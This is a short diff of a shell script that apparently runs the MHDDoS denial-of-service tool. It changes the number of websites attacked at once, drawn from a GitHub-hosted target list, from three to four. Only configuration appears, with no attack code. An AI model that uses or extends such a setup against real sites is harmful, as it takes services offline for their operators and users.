@@ -9,7 +9,7 @@
 restart_interval=600
 
 ## Number of sites to attack simultaneously. Sites choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
-num_of_targets=3
+num_of_targets=4
 
 # Install git if it doesn't installed already
 if [ ! -f /usr/bin/git ]; then
